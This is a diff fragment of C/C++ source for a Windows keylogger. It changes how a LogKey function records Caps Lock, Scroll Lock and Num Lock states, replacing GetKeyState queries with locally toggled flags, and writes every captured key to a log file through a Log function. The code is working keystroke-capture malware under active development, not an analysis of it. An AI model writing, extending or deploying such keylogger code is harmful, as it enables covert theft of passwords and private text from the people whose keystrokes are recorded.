@@ -9,8 +9,7 @@ void Log(char* input, const char fileName[]) {
 }
 
 bool LogKey(int key) {
-	caps = GetKeyState(VK_CAPITAL) & 1; // check toggled
-	shift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // check key down
+	bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // check key down
 
 
 
@@ -79,7 +78,10 @@ bool LogKey(int key) {
 		case VK_F11: Log("[F11]"); return true;
 		case VK_F12: Log("[F12]"); return true;
 		case VK_SNAPSHOT: Log("[PrtScn]"); return true;
-		case VK_SCROLL: Log(GetKeyState(VK_SCROLL) & 1 ? "[ScrLk On]" : "[ScrlLk] Off"); return true;
+		case VK_SCROLL:
+			scrLk = !scrLk;
+			Log(scrLk ? "[ScrLk On]" : "[ScrLk] Off");
+			return true;
 		case VK_PAUSE: Log("[PauBrk]"); return true;
 
 		case VK_INSERT: Log("[Ins]"); return true;
@@ -91,7 +93,10 @@ bool LogKey(int key) {
 
 		case VK_BACK: Log("[BackSpace]"); return true;
 		case VK_TAB: Log("[Tab]"); return true;
-		case VK_CAPITAL: Log(GetKeyState(VK_CAPITAL) & 1 ? "[CapsLk On]" : "[CapsLk Off]"); return true;
+		case VK_CAPITAL:
+			caps = !caps;
+			Log(caps ? "[CapsLk On]" : "[CapsLk Off]");
+			return true;
 		case VK_RETURN: Log("[Enter]"); return true;
 		case VK_SHIFT: Log("[Shift]"); return true;
 		case VK_CONTROL: Log("[Ctrl]"); return true;
@@ -105,7 +110,10 @@ bool LogKey(int key) {
 		case VK_LEFT: Log("[Left]"); return true;
 		case VK_RIGHT: Log("[Right]"); return true;
 
-		case VK_NUMLOCK: Log(GetKeyState(VK_NUMLOCK) & 1 ? "[NumLk On]" : "[NumLk Off]"); return true;
+		case VK_NUMLOCK:
+			numLk = !numLk;
+			Log(numLk ? "[NumLk On]" : "[NumLk Off]");
+			return true;
 		case VK_NUMPAD0: Log("[NUMPAD0]"); return true;
 		case VK_NUMPAD1: Log("[NUMPAD1]"); return true;
 		case VK_NUMPAD2: Log("[NUMPAD2]"); return true;
